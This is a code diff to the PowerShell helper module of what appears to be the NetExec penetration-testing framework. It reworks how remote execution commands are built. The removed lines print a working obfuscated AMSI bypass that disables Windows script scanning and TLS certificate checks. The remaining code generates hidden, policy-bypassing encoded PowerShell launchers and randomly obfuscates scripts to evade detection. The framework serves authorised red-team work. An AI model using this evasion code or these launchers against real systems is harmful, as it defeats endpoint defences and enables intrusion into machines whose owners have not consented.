@@ -12,6 +12,20 @@ import random
 
 obfuscate_ps_scripts = False
 
+def replace_singles(s):
+    """Replaces single quotes with a double quote
+    We do this because quoting is very important in PowerShell, and we are doing multiple layers:
+    Python, MSSQL, and PowerShell. We want to make sure that the command is properly quoted at each layer.
+
+    Args:
+    ----
+        s (str): The string to replace single quotes in.
+
+    Returns:
+    -------
+        str: Original string with single quotes replaced with double.
+    """
+    return s.replace("'", r"\"")
 
 def get_ps_script(path):
     """Generates a full path to a PowerShell script given a relative path.
@@ -108,91 +122,66 @@ def obfs_ps_script(path_to_script):
 
 
 
-def create_ps_command(ps_command, force_ps32=False, dont_obfs=False, custom_amsi=None):
+def create_ps_command(ps_command, force_ps32=False, obfs=False, custom_amsi=None, encode=True):
     """
     Generates a PowerShell command based on the provided `ps_command` parameter.
 
     Args:
     ----
         ps_command (str): The PowerShell command to be executed.
-
         force_ps32 (bool, optional): Whether to force PowerShell to run in 32-bit mode. Defaults to False.
-
-        dont_obfs (bool, optional): Whether to obfuscate the generated command. Defaults to False.
-
+        obfs (bool, optional): Whether to obfuscate the generated command. Defaults to False.
         custom_amsi (str, optional): Path to a custom AMSI bypass script. Defaults to None.
+        encode (bool, optional): Whether to encode the generated command (executed via -enc in PS). Defaults to True.
 
     Returns:
     -------
         str: The generated PowerShell command.
     """
+    nxc_logger.debug(f"Creating PS command parameters: {ps_command=}, {force_ps32=}, {obfs=}, {custom_amsi=}, {encode=}")
+    
     if custom_amsi:
+        nxc_logger.debug(f"Using custom AMSI bypass script: {custom_amsi}")
         with open(custom_amsi) as file_in:
             lines = list(file_in)
             amsi_bypass = "".join(lines)
     else:
-        amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-try{
-[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
-}catch{}
-"""
+        amsi_bypass = ""
 
-    command = amsi_bypass + f"\n$functions = {{\n    function Command-ToExecute\n    {{\n{amsi_bypass + ps_command}\n    }}\n}}\nif ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')\n{{\n    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32\n    $job | Wait-Job\n}}\nelse\n{{\n    IEX \"$functions\"\n    Command-ToExecute\n}}\n" if force_ps32 else amsi_bypass + ps_command
-
+    # for readability purposes, we do not do a one-liner
+    if force_ps32:  # noqa: SIM108
+        # https://stackoverflow.com/a/60155248
+        command = amsi_bypass + f"$functions = {{function Command-ToExecute{{{amsi_bypass + ps_command}}}}}; if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){{$job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32; $job | Wait-Job | Receive-Job }} else {{IEX '$functions'; Command-ToExecute}}"
+    else:
+        command = f"{amsi_bypass} {ps_command}"
+    
     nxc_logger.debug(f"Generated PS command:\n {command}\n")
 
-    # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed
-    # concurrently it would spawn a local powershell process per host which isn't ideal, until I figure out a good way
-    # of dealing with this  it will use the partial python implementation that I stole from GreatSCT
-    # (https://github.com/GreatSCT/GreatSCT) <3
-
-    """
-    if is_powershell_installed():
-
-        temp = tempfile.NamedTemporaryFile(prefix='nxc_',
-                                           suffix='.ps1',
-                                           dir='/tmp')
-        temp.write(command)
-        temp.read()
-
-        encoding_types = [1,2,3,4,5,6]
-        while True:
-            encoding = random.choice(encoding_types)
-            invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
-                                                                                                                                              temp.name,
-                                                                                                                                              encoding)
-            nxc_logger.debug(invoke_obfs_command)
-            out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
-
-            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)
-            nxc_logger.debug('Command length: {}'.format(len(command)))
-
-            if len(command) <= 8192:
-                temp.close()
-                break
-
-            encoding_types.remove(encoding)
-    
-    else:
-    """
-    if not dont_obfs:
+    if obfs:
+        nxc_logger.debug("Obfuscating PowerShell command")
         obfs_attempts = 0
         while True:
-            command = f'powershell.exe -exec bypass -noni -nop -w 1 -C "{invoke_obfuscation(command)}"'
+            nxc_logger.debug(f"Obfuscation attempt: {obfs_attempts + 1}")
+            obfs_command = invoke_obfuscation(command)
+            
+            command = f'powershell.exe -exec bypass -noni -nop -w 1 -C "{replace_singles(obfs_command)}"'
             if len(command) <= 8191:
                 break
-
             if obfs_attempts == 4:
                 nxc_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
                 exit(1)
-
+            nxc_logger.debug(f"Obfuscation length too long with {len(command)}, trying again...")
             obfs_attempts += 1
     else:
-        command = f"powershell.exe -noni -nop -w 1 -enc {encode_ps_command(command)}"
+        # if we arent encoding or obfuscating anything, we quote the entire powershell in double quotes, otherwise the final powershell command will syntax error
+        command = f"-enc {encode_ps_command(command)}" if encode else f'"{command}"'
+        command = f"powershell.exe -noni -nop -w 1 {command}"
+        
         if len(command) > 8191:
             nxc_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
             exit(1)
-
+            
+    nxc_logger.debug(f"Final command: {command}")
     return command
 
 
@@ -320,6 +309,7 @@ def invoke_obfuscation(script_string):
     -------
         str: The obfuscated payload for execution.
     """
+    nxc_logger.debug(f"Command before obfuscation: {script_string}")
     random_alphabet = "".join(random.choice([i.upper(), i]) for i in ascii_lowercase)
     random_delimiters = ["_", "-", ",", "{", "}", "~", "!", "@", "%", "&", "<", ">", ";", ":", *list(random_alphabet)]
 
@@ -436,5 +426,7 @@ def invoke_obfuscation(script_string):
         choice(["", " "]) + new_script + choice(["", " "]) + "|" + choice(["", " "]) + invoke_expression,
     ]
 
-    return choice(invoke_options)
+    obfuscated_script = choice(invoke_options)
+    nxc_logger.debug(f"Script after obfuscation: {obfuscated_script}")
+    return obfuscated_script
 
